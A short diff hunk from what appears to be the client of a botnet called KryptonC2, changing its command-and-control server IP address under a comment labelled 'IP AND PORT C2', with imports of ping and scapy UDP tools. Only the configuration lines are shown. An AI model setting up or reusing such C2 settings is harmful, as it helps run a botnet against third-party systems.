@@ -11,7 +11,7 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-KRYPTONC2_ADDRESS  = "94.154.33.47"
+KRYPTONC2_ADDRESS  = "54.160.248.2"
 KRYPTONC2_PORT     = 1337
 
 
